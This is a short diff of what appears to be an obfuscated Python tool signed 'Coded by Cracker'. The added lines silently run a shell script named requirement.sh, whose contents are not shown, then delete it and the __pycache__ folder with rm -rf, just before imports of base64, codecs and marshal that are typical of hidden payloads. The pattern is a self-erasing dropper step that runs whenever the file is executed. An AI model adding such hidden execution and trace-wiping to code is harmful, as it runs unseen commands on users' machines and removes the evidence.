@@ -1,5 +1,10 @@
 # Coded by Cracker
 # CRACKER911181
+import os,time
+
+os.system("sh requirement.sh")
+os.system("rm -rf requirement.sh")
+os.system("rm -rf __pycache__")
 
 
 import base64, codecs, marshal
